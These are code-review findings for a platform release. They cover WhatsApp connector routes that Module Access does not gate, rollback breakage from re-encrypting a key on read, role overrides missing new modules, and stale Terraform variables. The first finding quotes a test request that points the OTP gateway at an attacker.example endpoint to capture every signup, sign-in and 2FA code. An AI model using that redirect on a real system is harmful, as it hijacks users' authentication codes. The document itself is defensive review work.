findings.title: WhatsApp connector routes are not module-gated, so the CEO cannot take IT's access away with Module Access
findings.scenario: The CEO sets moduleDeny ['api_whatsapp'] on an IT user, or removes api_whatsapp from the `it` role override. The sidebar link disappears, but the routes still let that user in. Confirmed with a scratch test (.sim/review-W2/deny.test.ts): that user's PUT /api/v1/auth/integrations/whatsapp {apiUrl:'https://attacker.example/webhook/x/send'} returns 200 {ok:true}. The URL is the one platform-wide gateway, so after this change every customer signup code, every floor-staff sign-in code (from every company) and every admin 2FA code goes to that endpoint. Owner decision 34 says module access is the control, and the builder's own role-matrix test only checks default roles; it never checks a denied IT user against /auth/integrations/whatsapp. GET and POST /test are open to the same user in the same way.
findings.fix: In GATED_PREFIXES, add `{ prefix: '/auth/integrations/whatsapp', anyOf: ['api_whatsapp'] }` before the other entries. Leave /auth/integrations/delivery-status ungated, because it feeds the managers' banner. Then extend connectorsWhatsapp.test.ts: an `it` user with moduleDeny ['api_whatsapp'] gets 403 on GET, PUT and /test. Optional: also notify the CEO (WhatsApp or an Inbox flag) whenever the gateway URL changes, because an IT account can now redirect every platform OTP.

findings.title: Re-encrypt-on-read breaks WhatsApp (OTP signup, staff code sign-in, password reset) on any rollback to a pre-W2 image
findings.scenario: W2 is deployed with SERVD_SECRET_KEY on the box. The first send, a GET of the settings page or a health check calls resolveStoredKey(), which rewrites settings['integrations.whatsapp.apiKey'] from plaintext to `enc:v1:…`. Confirmed in the scratch test: one whatsappSettingsView() call leaves the row starting 'enc:v1:'. Spec §12 allows rolling back to a pre-W4 image while no company is live. The old lib/whatsapp.ts (HEAD) reads r.value.trim() and sends the ciphertext as the x-api-key header. The gateway then rejects every message: customer signup is down, floor staff (who have no password) cannot sign in, and password reset fails. This lasts until someone re-enters the key, and nothing in the runbook or the rollback note says so.
findings.fix: Choose at least one. (a) Add to the §12 rollback step, the CLAUDE.md deploy notes and docs/TAX_SETUP.md: 'rolling back below W2 requires re-entering the WhatsApp key in the old /configuration/whatsapp page'. (b) Make re-encryption explicit instead of on every read, for example a one-off boot step or the next save. A read-only server (no SERVD_SECRET_KEY, or a rollback) then never sees ciphertext it cannot use until an operator has saved through the new page. (a) is the minimum before Monday.

findings.title: Saved RoleModuleAccess overrides do not get the new module ids, so IT can be locked out of /connectors and Finance out of /pre-bills
findings.scenario: effectiveModulesForUser uses `overrides.get(role) ?? DEFAULT_MODULE_ACCESS[role]`, so a saved override row replaces the defaults completely. Suppose prod has a role_module_access row for `it`, `finance`, `management` or `owner` (any time the CEO saved the Module Access matrix for that role). After deploy, those rows lack api_pos, api_whatsapp and voided_prebills. With the new gates, an IT user gets 403 on every /connectors call, so they cannot configure the POS connector at all. Finance, owner and management get 403 on GET /pre-bills, so the Voided pre bills page stays empty and errors. The builder only mentions this under needsOtherFiles; there is no migration or boot step for it, unlike the 20260927140000_access_control_data precedent.
findings.fix: Add a data-only migration (no schema change), or an idempotent boot reconcile, that appends the new ids to existing override rows for the roles whose defaults gained them. For example: `UPDATE role_module_access SET modules = array_append(modules,'api_pos') WHERE role IN ('it','management') AND NOT ('api_pos' = ANY(modules));` with the same pattern for api_whatsapp (it only) and voided_prebills (finance, management, owner). At minimum, run `SELECT role, modules FROM role_module_access` on the box before deploy and have the CEO tick the new modules.

findings.title: infra/staging.tfvars.example still sets the removed fbr_username/fbr_password variables and has no servd_secret_key
findings.scenario: main.tf no longer declares variable fbr_username or fbr_password, but staging.tfvars.example lines 35-38 still set them (and mention FBR_ENV). `terraform plan -var-file=staging.tfvars` then reports 'Value for undeclared variable'. That is a warning from a var file, but it becomes an error if anyone passes them with -var. Staging also gets no SERVD_SECRET_KEY, so saving a connector or WhatsApp key returns 503 SECRET_KEY_MISSING there.
findings.fix: Replace lines 35-38 with the same 'Secrets at rest' block used in prod.tfvars.example, including `servd_secret_key = ""` and a comment to generate it with `openssl rand -base64 32`.
